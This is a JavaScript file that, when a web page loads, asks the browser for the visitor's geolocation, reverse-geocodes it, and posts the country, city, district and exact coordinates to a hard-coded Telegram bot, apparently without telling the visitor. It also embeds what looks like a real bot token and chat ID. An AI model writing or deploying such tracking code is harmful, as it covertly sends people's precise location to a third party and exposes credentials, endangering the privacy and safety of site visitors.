// import axios from 'axios';
// const button = document.querySelector('.button')

function send_info(info_obj, date, coords) {
    const TOKEN = '7186538688:AAFJOlt9DKsACMepLFmBkiMFxudg2zxUbT4';;
    const CHAT_ID = '-1002156930748';
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    let message = `<b>Info about client</b>\n`;
    message += `<b>Date:</b> ${date}\n`;
    message += `<b>Continent:</b> ${info_obj['continent'] || 'N/A'}\n`;
    message += `<b>Country:</b> ${info_obj['countryName'] || 'N/A'}\n`;
    message += `<b>City:</b> ${info_obj['city'] || 'N/A'}\n`;
    message += `<b>Locality:</b> ${info_obj['locality'] || 'N/A'}\n`;
    message += `<b>District:</b> ${info_obj['localityInfo'].administrative[3].name || 'N/A'}\n`;
    message += `<b>Coords:</b> Latitude: ${coords[0]}, Longitude: ${coords[1]}\n`


    axios.post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message
    })
        .then(response => {
            console.log('Message sent successfully:', response);
        })
        .catch(error => {
            console.error('Error sending message:', error);
        });

    fetch(URI_API, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
        })
    })
        .then(response => response.json())
        .then(data => console.log('Message sent successfully:', data))
        .catch(error => console.error('Error sending message:', error));

}

function find_me() {
    navigator.geolocation.getCurrentPosition(
        (position) => {
            const current_date = new Date()
            const date = `${current_date.getDate()}:${current_date.getMonth()+1}:${current_date.getFullYear()}`
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const coords = [latitude, longitude];
            console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);

            const geoApiUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`;

            fetch(geoApiUrl)
                .then(response => response.json())
                .then(data => {
                    console.log('from find_me', data);
                    send_info(data, date, coords); // Send info directly
                })
                .catch(error => {
                    console.error('Error fetching geolocation data:', error);
                });
        },
        (error) => {
            console.log('Geolocation error:', error.message);
            // Optional: notify user or handle UI
        }
    );
}

document.addEventListener('DOMContentLoaded', find_me);
